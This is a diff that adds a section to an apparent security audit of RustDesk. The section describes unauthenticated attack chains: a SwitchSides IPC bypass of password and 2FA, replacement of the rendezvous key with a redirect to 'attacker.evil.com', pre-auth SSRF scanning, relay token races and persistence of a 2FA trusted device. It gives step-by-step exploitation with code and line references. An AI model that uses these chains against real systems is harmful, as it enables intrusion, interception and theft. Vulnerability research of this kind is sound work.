@@ -2219,3 +2219,455 @@ BOTTOM LINE:
 - NO local access, NO network adjacency, NO special config needed
 - Works against DEFAULT configuration through the PUBLIC rendezvous server
 ```
+
+---
+
+# Part VII: Novel Unauthenticated Access Chains — Beyond Password Cracking
+
+## Methodology
+
+Parts I-VI focused on password-centric attacks. This section presents **novel attack chains that bypass authentication entirely** — no password cracking, no brute-force. These chains exploit protocol design flaws, pre-auth message processing gaps, trust chain weaknesses, and cross-connection state confusion to achieve unauthorized access through chaining multiple vulnerabilities.
+
+## Pre-Authentication Attack Surface Map
+
+The `on_message` handler (`src/server/connection.rs:2089`) processes these message types **BEFORE** `self.authorized` is set to `true`:
+
+| Message Type | Line | Auth Check | Side Effect |
+|---|---|---|---|
+| `Misc::CloseReason` | 2092 | NONE | Closes connection, removes session from global SESSIONS |
+| `LoginRequest::FileTransfer` | 2106 | NONE | Sets `self.file_transfer` flag (pre-auth mode selection) |
+| `LoginRequest::ViewCamera` | 2118 | NONE | Sets `self.view_camera = true` |
+| `LoginRequest::Terminal` | 2127 | NONE | Sets `self.terminal = true`, processes OS credentials |
+| `LoginRequest::PortForward` | 2175 | NONE | **`TcpStream::connect()` to arbitrary host:port** |
+| `Auth2fa` | 2321 | Partial (2FA code only) | Can grant full auth, stores trusted device |
+| `TestDelay` | 2354 | NONE | Reflects messages, writes global VIDEO_QOS state |
+| `SwitchSidesResponse` | 2370 | NONE | **UUID match → `authorized = true` WITHOUT password** |
+
+**Password validation happens ONLY at line 2297** — everything above executes before it.
+
+**Authorization (`self.authorized = true`) is set ONLY at line 1376** in `send_logon_response()`, reachable via:
+1. Line 2278: `is_recent_session(false)` (session reuse — still needs password hash)
+2. Line 2314: After `validate_password()` succeeds
+3. Line 2332: After 2FA validation succeeds
+4. **Line 2383: After `SwitchSidesResponse` UUID match — NO PASSWORD CHECK**
+
+## FINDING 21 (CRITICAL): SwitchSides IPC → Complete Authentication Bypass
+
+**Files:** `src/ipc.rs:738-745`, `src/server/connection.rs:2370-2394`, `src/server/connection.rs:4710-4715`
+**Impact:** Any local user gains full RustDesk access WITHOUT password or 2FA
+**Type:** CWE-288 (Authentication Bypass Using an Alternate Path)
+
+### The SwitchSides Mechanism (Normal Flow)
+
+"Switch Sides" lets an authenticated client swap roles with the server — the server becomes the client and vice versa. Normal flow:
+
+```
+1. Client A (authenticated on Server B) calls switch_sides()
+2. A's IPC handler generates UUID v4, stores in SWITCH_SIDES_UUID[A_id]
+3. A sends Misc::SwitchSidesRequest(uuid) to B over network
+4. B receives request (POST-AUTH handler, line 3085)
+5. B runs: run_me(["--connect", A_id, "--switch_uuid", uuid])
+6. B's new process connects to A's server
+7. B sends SwitchSidesResponse(uuid, login_request)
+8. A's server matches UUID → authorized WITHOUT password
+```
+
+### The Exploit: IPC Socket → UUID Theft → Auth Bypass
+
+The IPC socket is world-accessible (`0o0777` on Unix, `SecurityAttributes::allow_everyone_create()` on Windows). **Any local user** can:
+
+```
+Step 1: Connect to IPC socket (no authentication required)
+        └─ ipc.rs:442  → permissions 0o0777
+        └─ ipc.rs:433  → allow_everyone_create() on Windows
+
+Step 2: Send Data::SwitchSidesRequest("attacker_fake_id")
+        └─ ipc.rs:738  → handler receives the request
+
+Step 3: IPC generates UUID v4 and stores it
+        └─ ipc.rs:739  → let uuid = uuid::Uuid::new_v4();
+        └─ ipc.rs:740  → insert_switch_sides_uuid("attacker_fake_id", uuid)
+        └─ connection.rs:4710-4714 → SWITCH_SIDES_UUID["attacker_fake_id"] = (now, uuid)
+
+Step 4: IPC returns UUID to the attacker
+        └─ ipc.rs:743  → stream.send(&Data::SwitchSidesRequest(uuid.to_string()))
+        └─ Attacker now KNOWS the UUID
+
+Step 5: Attacker opens TCP connection to RustDesk server
+        └─ Can be localhost, or via RS-mediated connection
+        └─ Server sends Hash{salt, challenge} in on_open (line 1216)
+
+Step 6: Attacker SKIPS LoginRequest entirely
+        └─ Sends SwitchSidesResponse message directly:
+        └─ uuid: the UUID from Step 4
+        └─ lr.my_id: "attacker_fake_id" (matches SWITCH_SIDES_UUID key)
+
+Step 7: Server processes SwitchSidesResponse (PRE-AUTH, line 2370)
+        └─ connection.rs:2377 → cleans entries older than 10 seconds
+        └─ connection.rs:2378 → removes "attacker_fake_id" from SWITCH_SIDES_UUID
+        └─ connection.rs:2381 → uuid == uuid_old → MATCH!
+        └─ connection.rs:2382 → self.from_switch = true
+        └─ connection.rs:2383 → self.send_logon_response().await
+
+Step 8: send_logon_response() grants full access
+        └─ connection.rs:1345 → self.require_2fa.is_some() && !self.from_switch
+        └─ from_switch = true → 2FA CHECK COMPLETELY SKIPPED
+        └─ connection.rs:1376 → self.authorized = true
+        └─ FULL ACCESS: screen, keyboard, files, terminal (root shell), port forwarding
+```
+
+### Why This Is Critical
+
+- **No password needed** — the UUID is the only "credential" and it's obtained from IPC
+- **No 2FA needed** — `from_switch = true` explicitly bypasses the 2FA check (line 1345)
+- **Any local user** — the IPC socket is world-accessible
+- **No timing window** — attacker controls both the UUID request and the connection timing
+- **Works on all platforms** — Unix (0o0777) and Windows (allow_everyone_create)
+- **Default configuration** — no special settings required
+
+### The 10-Second Race Window
+
+The UUID entry is cleaned up after 10 seconds (line 2377). But since the attacker controls both steps (IPC request and TCP connection), they can execute both within milliseconds. There is no real race condition — the attacker has complete control of timing.
+
+## FINDING 22 (CRITICAL): IPC RS Public Key Injection → Full Trust Chain Takeover
+
+**Files:** `src/ipc.rs:690-703`, `src/common.rs` (`get_rs_pk`, `decode_id_pk`)
+**Impact:** Attacker replaces RS public key via IPC → controls all future connection trust
+**Type:** CWE-295 (Improper Certificate Validation) / CWE-345 (Insufficient Verification of Data Authenticity)
+
+### The Attack Chain
+
+The Rendezvous Server (RS) is the **sole root of trust** in RustDesk. It signs `{ID, PublicKey}` pairs that clients use to verify peer identity. The RS public key determines what signatures are trusted.
+
+```
+Step 1: Attacker connects to world-accessible IPC socket
+
+Step 2: Send Data::Options with "key" → attacker_public_key_base64
+        └─ ipc.rs:690-703 → Config::set_option("key", attacker_key)
+        └─ No authentication, no validation, immediate effect
+
+Step 3: Send Data::Options with "rendezvous-servers" → "attacker.evil.com"
+        └─ Redirects all RS communication to attacker-controlled server
+        └─ Application will reconnect to new RS
+
+Step 4: Attacker's rogue RS signs arbitrary {ID, PublicKey} pairs
+        └─ common.rs:decode_id_pk verifies against the "key" config option
+        └─ Since "key" is now attacker's key → signatures verify correctly
+
+Step 5: All future connections trust attacker's signatures
+        └─ Client connects to peer → asks RS for peer's signed PK
+        └─ Attacker's RS returns {peer_id, attacker_pk} signed with attacker's key
+        └─ Client verifies signature → succeeds (key replaced in Step 2)
+        └─ DH key exchange uses attacker's PK → attacker has shared secret
+        └─ FULL MITM: attacker decrypts, modifies, re-encrypts all traffic
+
+Result: Every future remote connection is transparently intercepted
+```
+
+### Chaining: IPC RS Override → Remote Access to ALL Peers
+
+1. **Local attacker** replaces RS key and server via IPC (Finding 22)
+2. **Target device** now connects to attacker's rogue RS
+3. Any peer connecting TO this device → attacker controls key exchange → MITM
+4. Any connection FROM this device → attacker controls relay selection → MITM
+5. Through MITM, attacker captures passwords, session tokens, file transfers
+6. Attacker uses captured credentials to access other devices
+7. **Lateral movement**: one local IPC access → access to entire fleet
+
+## FINDING 23 (HIGH): Protocol Downgrade → SwitchSides UUID Theft → Remote Auth Bypass
+
+**Files:** `src/client.rs:781-816`, `src/server/connection.rs:2370-2394`, `src/server/connection.rs:3085-3097`
+**Impact:** Network attacker hijacks switch-sides operation for passwordless access
+**Type:** CWE-757 (Selection of Less-Secure Algorithm During Negotiation)
+
+### The Attack Chain
+
+When two peers use "Switch Sides" and an attacker has network MITM position:
+
+```
+SETUP: Client A ←──MITM──→ Server B (encrypted connection)
+
+Step 1: MITM forces protocol downgrade on NEXT connection
+        └─ When B starts new process to connect back to A,
+            MITM intercepts the RS PunchHoleResponse
+        └─ Returns empty signed_id_pk → client.rs:781-787
+        └─ B's new process falls back to unencrypted
+
+Step 2: A sends SwitchSidesRequest(uuid) to B over EXISTING connection
+        └─ connection.rs:3085 (POST-AUTH handler)
+        └─ If existing connection was also downgraded, UUID visible in plaintext
+
+Step 3: B starts: run_me(["--connect", A_id, "--switch_uuid", uuid])
+        └─ B's new process connects to A
+        └─ All traffic visible to MITM (no encryption due to downgrade)
+
+Step 4: MITM captures UUID from B's SwitchSidesResponse
+
+Step 5: MITM RACES B's process — connects to A's server FIRST
+        └─ Sends SwitchSidesResponse with stolen UUID
+        └─ UUID is consumed (remove from HashMap) — one-time use
+
+Step 6: A's server validates UUID → authorized
+        └─ connection.rs:2381-2383 → from_switch = true → full access
+        └─ MITM is now authorized on A without any password
+
+Step 7: B's legitimate process fails
+        └─ UUID already consumed → no match → connection rejected
+```
+
+### Real-World Trigger
+
+Switch Sides is triggered by user action in the Flutter UI (`flutter_ffi.rs:900`). An attacker with persistent MITM position (e.g., ARP spoofing on LAN, compromised router) waits for a Switch Sides event, then executes the race.
+
+## FINDING 24 (HIGH): Pre-Auth SSRF → Internal Network Reconnaissance
+
+**Files:** `src/server/connection.rs:2175-2207`
+**Impact:** Unauthenticated attacker scans internal network through target device
+**Type:** CWE-918 (Server-Side Request Forgery)
+
+### Validated Pre-Auth TCP Connect
+
+```rust
+// connection.rs:2190-2206 — INSIDE LoginRequest handler, BEFORE password check
+let mut addr = format!("{}:{}", pf.host, pf.port);  // Attacker-controlled
+self.port_forward_address = addr.clone();
+match timeout(3000, TcpStream::connect(&addr)).await {  // FIRES PRE-AUTH
+    Ok(Ok(sock)) => {
+        self.port_forward_socket = Some(Framed::new(sock, BytesCodec::new()));
+        // Socket stored — connection established to internal target
+    }
+    _ => {
+        self.send_login_error(format!(
+            "Failed to access remote {}, please make sure if it is open",
+            addr    // INFORMATION DISCLOSURE: reveals port status
+        )).await;
+        return false;
+    }
+}
+```
+
+### Exploitation
+
+```
+Step 1: Connect to target RustDesk device (via RS, default config)
+
+Step 2: Send LoginRequest with PortForward variant:
+        host: "192.168.1.1"    ← attacker-controlled
+        port: 22               ← attacker-controlled
+
+Step 3: Server makes TCP connection to 192.168.1.1:22 BEFORE checking password
+        └─ Success: no error sent, port_forward_socket stored
+        └─ Failure: error message "Failed to access remote 192.168.1.1:22"
+
+Step 4: Attacker learns:
+        └─ Port open → no immediate error (connection stays alive)
+        └─ Port closed → specific error message returned
+        └─ Host unreachable → different error/timeout behavior
+
+Step 5: Repeat with different hosts and ports
+        └─ NO login timeout on unauthenticated connections (Finding 25)
+        └─ NO rate limiting on LoginRequest submissions
+        └─ Map entire internal network: hosts, ports, services
+
+Step 6: Special targets:
+        └─ "RDP" + port 0 → auto-expanded to localhost:3389 (line 2182-2185)
+        └─ localhost:* → scan all services on the target machine
+        └─ 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 → scan internal ranges
+```
+
+## FINDING 25 (MEDIUM): No Login Timeout → Indefinite Pre-Auth Resource Hold
+
+**File:** `src/server/connection.rs:465, 907-917, 1721`
+**Impact:** Unauthenticated connections persist indefinitely, enabling sustained attacks
+**Type:** CWE-400 (Uncontrolled Resource Consumption)
+
+### The Gap
+
+```rust
+// Line 465 (Connection::new):
+auto_disconnect_timer: None,  // ← Starts as None
+
+// Line 1721 (send_logon_response — POST-AUTH ONLY):
+self.auto_disconnect_timer = Self::get_auto_disconenct_timer();  // ← Only set AFTER auth
+
+// Line 907-917 (main loop timer):
+if let Some((instant, minute)) = conn.auto_disconnect_timer.as_ref() {
+    // Only fires if timer exists — which is NEVER for unauthed connections
+}
+```
+
+**No mechanism disconnects unauthenticated connections.** Combined with:
+- Pre-auth SSRF (Finding 24): each connection holds an internal TCP socket open
+- Pre-auth TestDelay reflection (line 2354): keepalive without authentication
+- No connection limit: unlimited unauthenticated connections simultaneously
+
+An attacker can exhaust file descriptors and memory by opening thousands of unauthenticated connections, each holding an internal SSRF socket.
+
+## FINDING 26 (HIGH): Relay Connection Token Race → Session Hijack
+
+**Files:** `src/client.rs:860-920`, `src/rendezvous_mediator.rs:413-452`
+**Impact:** Attacker hijacks relay pairing to intercept/inject traffic
+**Type:** CWE-362 (Concurrent Execution Using Shared Resource with Improper Synchronization)
+
+### Relay Token Mechanism
+
+Relay connections use UUID v4 tokens to match two peers at the relay server. The token flows:
+1. Client generates UUID → sends to RS in `RelayResponse`
+2. RS forwards UUID to relay server in `RequestRelay`
+3. Peer also sends `RequestRelay` with same UUID
+4. Relay server pairs connections by UUID match
+
+### The Race
+
+```
+Step 1: Attacker monitors RS communication (network MITM or rogue RS)
+Step 2: Observes RelayResponse containing UUID from legitimate client
+Step 3: Attacker sends RequestRelay(uuid) to relay server BEFORE the peer
+Step 4: Relay server pairs attacker with the legitimate client
+Step 5: Legitimate peer's RequestRelay arrives → UUID already consumed
+Step 6: Attacker sits between client and server:
+        ├─ Decrypts if protocol was downgraded
+        ├─ Sees all screen data, keystrokes, file transfers
+        └─ Can inject commands in real-time
+```
+
+### Critical Weakness
+
+- Relay server performs **no authentication** — just UUID matching
+- No cryptographic binding between UUID and peer identity
+- No verification that RequestRelay came from the expected peer
+- Attack requires network MITM position OR rogue RS (chainable with Finding 22)
+
+## FINDING 27 (MEDIUM): Trusted Device Persistence → Permanent 2FA Bypass
+
+**File:** `src/server/connection.rs:2338-2345`
+**Impact:** One-time 2FA code → permanent future 2FA bypass
+**Type:** CWE-613 (Insufficient Session Expiration) / CWE-308 (Use of Single-factor Authentication)
+
+### Trusted Device Storage
+
+When a user successfully completes 2FA, the Auth2fa handler stores a "trusted device":
+
+```rust
+// connection.rs:2338-2345 — POST-AUTH, inside Auth2fa handler
+Config::add_trusted_device(TrustedDevice {
+    hwid: tfa.hwid,           // ← CLIENT-PROVIDED
+    time: hbb_common::get_time(),
+    id: self.lr.my_id.clone(),      // ← CLIENT-PROVIDED
+    name: self.lr.my_name.clone(),  // ← CLIENT-PROVIDED
+    platform: self.lr.my_platform.clone(), // ← CLIENT-PROVIDED
+});
+```
+
+### The Attack
+
+```
+Step 1: Attacker obtains ONE valid 2FA code
+        └─ Social engineering, telegram bot compromise, phishing
+        └─ Temporary: code is only valid for 30 seconds
+
+Step 2: Authenticate with password + 2FA code
+        └─ Include crafted hwid in Auth2fa message: hwid="ATTACKER_PERSISTENT_ID"
+
+Step 3: Trusted device record persisted to Config (disk)
+        └─ {hwid: "ATTACKER_PERSISTENT_ID", id: "attacker_id", name: "attacker", platform: "Windows"}
+
+Step 4: All future connections — 2FA bypassed permanently
+        └─ handle_login_request_without_validation (line 2039-2050):
+        └─ Matches hwid + id + name + platform → self.require_2fa = None
+        └─ Only need password — 2FA never prompted again
+
+Step 5: Even if 2FA secret is rotated, trusted device persists
+        └─ Only cleared by explicit Data::ClearTrustedDevices IPC command
+```
+
+## FINDING 28 (MEDIUM): Cross-Connection LOGIN_FAILURES Poisoning → Targeted Lockout
+
+**File:** `src/server/connection.rs:70, 3412-3461`
+**Impact:** Attacker locks out legitimate users by poisoning shared rate-limiting state
+**Type:** CWE-770 (Allocation of Resources Without Limits or Throttling)
+
+### The Vulnerability
+
+```rust
+// Line 70: Global mutable state shared across ALL connections
+static ref LOGIN_FAILURES: Arc<Mutex<HashMap<String, (i32, i32, i32)>>> = Default::default();
+```
+
+Rate limiting uses IP-based tracking. An attacker can:
+1. Send 6 failed login attempts from a target IP (or shared NAT IP)
+2. Legitimate user on same IP is now locked out for that minute
+3. Send 30 total attempts → permanent lockout (until service restart)
+4. In-memory state → resets on restart, but attacker can repeat
+
+In shared network environments (corporate NAT, WiFi hotspots, VPN exit nodes), an attacker behind the same IP can deny service to all other users on that IP.
+
+---
+
+## Complete Novel Attack Chains Summary
+
+### Chain I: Local → Full Access (No Password, No 2FA)
+```
+IPC socket (0o0777) → SwitchSidesRequest → Get UUID →
+TCP connect → SwitchSidesResponse(uuid) → authorized = true
+Findings: 21 (SwitchSides bypass)
+Impact: CRITICAL — any local user → root shell
+```
+
+### Chain J: Local → Persistent MITM of All Connections
+```
+IPC socket → Set "key" to attacker PK → Set "rendezvous-servers" to attacker RS →
+Rogue RS signs arbitrary {ID, PK} pairs → MITM all future connections →
+Capture passwords → Access all connected peers
+Findings: 22 (RS PK injection) + 5 (IPC world-accessible)
+Impact: CRITICAL — one local access → control entire device fleet
+```
+
+### Chain K: Network MITM → Passwordless Access via SwitchSides Theft
+```
+Force protocol downgrade → Observe SwitchSidesRequest(uuid) in plaintext →
+Race legitimate connection → SwitchSidesResponse(stolen_uuid) → authorized
+Findings: 23 (UUID theft) + 13 (protocol downgrade)
+Impact: HIGH — network position → full access without credentials
+```
+
+### Chain L: Remote → Internal Network Mapping (Default Config)
+```
+RS-mediated connection → LoginRequest::PortForward(internal_host:port) →
+Server TcpStream::connect() BEFORE auth → Error/success reveals port status →
+No login timeout → scan indefinitely → map entire internal network
+Findings: 24 (pre-auth SSRF) + 25 (no login timeout)
+Impact: HIGH — zero credentials → full internal network reconnaissance
+```
+
+### Chain M: Relay Token Race → Traffic Interception
+```
+Network MITM → Observe relay UUID → Race to relay server →
+Hijack pairing → Sit between client and server → See/modify all traffic
+Findings: 26 (relay race) + 13 (protocol downgrade)
+Impact: HIGH — intercept all data in relay connections
+```
+
+### Chain N: One-Time 2FA → Permanent Bypass
+```
+Social engineer one 2FA code → Authenticate once →
+Trusted device stored with attacker-controlled fields →
+All future connections: 2FA bypassed via HWID match
+Findings: 27 (trusted device persistence)
+Impact: MEDIUM — one phished code → permanent 2FA bypass
+```
+
+---
+
+## Key Innovation: These Chains Avoid Password Cracking
+
+| Chain | Password Needed? | 2FA Needed? | Access Required |
+|---|---|---|---|
+| I (SwitchSides IPC) | **NO** | **NO** | Local (any user) |
+| J (RS PK Injection) | **NO** | **NO** | Local (any user) |
+| K (UUID Theft) | **NO** | **NO** | Network MITM |
+| L (Pre-Auth SSRF) | **NO** | **NO** | Network (any) |
+| M (Relay Race) | **NO** | **NO** | Network MITM |
+| N (2FA Persistence) | Yes (once) | Yes (once) | Network (any) |
+
+Chains I and J are the most critical: they require only local access to any user account and achieve full RustDesk access (including root shell on Linux) without knowing any password or 2FA code.
